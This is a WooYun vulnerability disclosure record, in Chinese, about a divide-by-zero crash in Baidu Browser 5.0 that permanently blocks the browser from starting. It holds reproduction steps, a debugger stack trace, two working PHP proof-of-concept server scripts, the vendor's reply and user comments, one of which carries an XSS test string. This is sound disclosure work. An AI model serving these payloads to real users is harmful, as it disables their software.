{"id": 7296, "wybug_id": "wooyun-2013-037842", "wybug_title": "百度浏览器5.0正式版除以零异常永久性拒绝服务", "wybug_corp": "百度", "wybug_author": "blast", "wybug_date": "2013-09-23 12:04", "wybug_open_date": "2013-12-22 12:04", "wybug_type": "拒绝服务", "wybug_level": "低", "wybug_rank_0": "5", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["拒绝服务"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-09-23：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-09-23：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-09-26：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2013-11-17：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-11-27：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-12-07：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-12-22：\t细节向公众公开  简要描述： 断点续传考虑不周，xnet!AcquireAsynHttpService+0x2790b （div     eax,ecx）引发DIVIDED_BY_ZERO异常，打开网页一回，永远用不了百度浏览器。Exception Code: 0XC0000094(EXCEPTION_INT_DIVIDE_BY_ZERO) 详细说明：  重现步骤：1、 打开网页 a.php(源码见证明1)2、 此时点击下载，不要暂停，然后关闭浏览器\n\n\n\n3、 服务器上的a.php在用户关闭浏览器之后内容变化了，例如证明24、 重新打开浏览器，断点续传xnet!AcquireAsynHttpService开始工作了，由于返回的东西比之前的要小，而且文件此时一个字都没下，这货重新获取大小，然后计算百分比，我猜的。5、 可爱的除以0异常\n\n由于这个同步过程在每次启动浏览器的时候执行，所以只要下载列表里面还有这个玩意儿，浏览器就永远不可能启动成功。除非卸载而且删除用户配置。(fe8.4e8): Integer divide-by-zero - code c0000094 (first chance)First chance exceptions are reported before any exception handling.This exception may be expected and handled.*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\\Program Files (x86)\\baidu\\BaiduBrowser\\xnet.dll - xnet!AcquireAsynHttpService+0x2790b:5bc4b51b f7f1            div     eax,ecx0:033:x86> kChildEBP RetAddr  WARNING: Stack unwind information not available. Following frames may be wrong.0ae9f864 5bc15b4e xnet!AcquireAsynHttpService+0x2790b0ae9f88c 5bc14817 xnet+0x25b4e0ae9f8b4 5bc11581 xnet+0x248170ae9f8ec 5bc07a08 xnet+0x215810ae9f908 5bc04df0 xnet+0x17a080ae9f934 5bc05a98 xnet+0x14df0*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\\Program Files (x86)\\baidu\\BaiduBrowser\\bdcommon.dll - 0ae9f968 5e7128a3 xnet+0x15a980ae9f974 5e712b4b bdcommon!Util::Help::GetMimeTypeByExt+0x33c20ae9f9b0 5e7124d5 bdcommon!Util::Help::GetMimeTypeByExt+0x366a0ae9f9e0 5e70fdea bdcommon!Util::Help::GetMimeTypeByExt+0x2ff40ae9f9f4 5e70fcad bdcommon!Util::Help::GetMimeTypeByExt+0x9090ae9fa20 5e710d18 bdcommon!Util::Help::GetMimeTypeByExt+0x7cc0ae9fa28 5e713159 bdcommon!Util::Help::GetMimeTypeByExt+0x18370ae9fa60 5e7135c9 bdcommon!Util::Help::GetMimeTypeByExt+0x3c780ae9fa68 5e71ca16 bdcommon!Util::Help::GetMimeTypeByExt+0x40e80ae9faa0 5e71caa0 bdcommon!Util::Common::Timer::EraseTimerCallback+0x58e50ae9faac 753f336a bdcommon!Util::Common::Timer::EraseTimerCallback+0x596f0ae9fab8 77709f72 kernel32!BaseThreadInitThunk+0xe0ae9faf8 77709f45 ntdll32!__RtlUserThreadStart+0x700ae9fb10 00000000 ntdll32!_RtlUserThreadStart+0x1b   漏洞证明：  证明1（ps 证明的A我删了点……估摸着不影响结果，如果有问题请多加点A……）：\n<?php    header(\"Content-type: application/octet-stream\");    //返回的文件        header(\"Accept-Ranges: bytes\");            //按照字节大小返回    header(\"Accept-Length: 899999999999999999999999999999999999989999999999999999999999999999999999998999999999999999998999999999999999999999999999999999999899999999999999999999999999999999999989999999999999999989999999999999999999999999999999999998999999999999999999999999999999999999899999999999999999\");    //返回文件大小    header(\"Content-Length: 899999999999999999999999999999999999989999999999999999999999999999999999998999999999999999998999999999999999999999999999999999999899999999999999999999999999999999999989999999999999999989999999999999999999999999999999999998999999999999999999999999999999999999899999999999999999\");    //返回文件大小    header(\"Content-Disposition: attachment; filename=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\");//这里客户端的弹出对话框，对应的文件名    ?>\n证明2：\n<?php    header(\"Content-type: application/octet-stream\");    //返回的文件        header(\"Accept-Ranges: bytes\");            //按照字节大小返回    header(\"Accept-Length: 8999999999999999999999999999999999999899999999999999999999999999999999999989999999999999999989999999999999\");    //返回文件大小    header(\"Content-Length: 8999999999999999999999999999999999999899999999999999999999999999999999999989999999999999999989999999999999\");    //返回文件大小    header(\"Content-Disposition: attachment; filename=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\");//这里客户端的弹出对话框，对应的文件名    ?>\n   修复方案：  别除0……   版权声明：转载请注明来源 blast@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：2  确认时间：2013-09-23 23:40 厂商回复： 感谢对百度安全的关注，我们会尽快处理此问题。--“百度，因你更安全” 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-09-23 12:10 |    \t\tRookie \t\t\t( 普通白帽子  |\t\t\t        Rank:288 漏洞数:78        | 123)\t\t \n  那就换其他浏览器    \n     2013-09-23 13:12 |    \t\tVIP \t\t\t( 普通白帽子  |\t\t\t        Rank:759 漏洞数:100        )\t\t \n  那就换其他浏览器    \n     2013-09-23 13:13 |    \t\tressx \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:2        | 极为缓慢，沉重，凝滞的前行)\t\t \n  那就换其他浏览器    \n     2013-09-23 13:13 |    \t\t乌云官方_1 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | test)\t\t \n  那就换其他浏览器    \n     2013-09-23 13:25 |    \t\tblast \t\t\t( 普通白帽子  |\t\t\t        Rank:348 漏洞数:57        | 五仁委员会)\t\t \n  专业断楼三十年=。=||     \n     2013-09-23 13:28 |    \t\t雅柏菲卡 \t\t\t( 普通白帽子  |\t\t\t        Rank:1213 漏洞数:234        | 雙魚座聖鬥士雅柏菲卡)\t\t \n  那就换其他浏览器    \n     2013-09-23 13:34 |    \t\t小威 \t\t\t( 普通白帽子  |\t\t\t        Rank:492 漏洞数:76        | 活到老，学到老!)\t\t \n  那就换其他浏览器    \n     2013-09-23 13:55 |    \t\t专业查水表 \t\t\t( 路人 |\t\t\t        Rank:1 漏洞数:5        | \"><script>alert(/我是\"J.L\"的大号/);</scr...)\t\t \n  那就换其他浏览器    \n     2013-09-23 15:46 |    \t\tblast \t\t\t( 普通白帽子  |\t\t\t        Rank:348 漏洞数:57        | 五仁委员会)\t\t \n  楼层粉碎机!    \n     2013-09-23 16:35 |    \t\tMas \t\t\t( 实习白帽子  |\t\t\t        Rank:42 漏洞数:15        )\t\t \n  那就换其他浏览器    \n     2013-09-23 17:31 |    \t\tj0phy \t\t\t( 路人 |\t\t\t        Rank:26 漏洞数:4        | Bloger & Scanner & Optimist)\t\t \n  那就换其他浏览器    \n     2013-09-24 08:26 |    \t\t围剿 \t\t\t( 路人 |\t\t\t        Rank:17 漏洞数:5        | Evil decimal)\t\t \n  破！专业拆楼三十载！    \n     2013-09-27 11:02 |    \t\twoody \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:1        | 菜鸟一枚)\t\t \n  那就换其他浏览器    \n     2013-09-27 11:21 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  那就换其他浏览器，2rank而已    \n     2013-09-27 12:28 |    \t\t一只猿 \t\t\t( 普通白帽子  |\t\t\t        Rank:463 漏洞数:89        | 硬件与无线通信研究方向)\t\t \n  那就换其他浏览器    \n     2013-09-27 20:55 |    \t\tblast \t\t\t( 普通白帽子  |\t\t\t        Rank:348 漏洞数:57        | 五仁委员会)\t\t \n  感谢楼上所有帽子们……我换了……    \n     2013-09-28 17:50 |    \t\tdtc \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:1        | 业余技术爱好者，来乌云学习。)\t\t \n  那就换其他浏览器    \n     2013-12-22 13:08 |    \t\t邪少 \t\t\t( 实习白帽子  |\t\t\t        Rank:58 漏洞数:7        )\t\t \n  那就换其他浏览器，2rank而已     \n     2013-12-23 10:01 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  那就换其他浏览器，2rank那么低    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 2, "Ranks": null}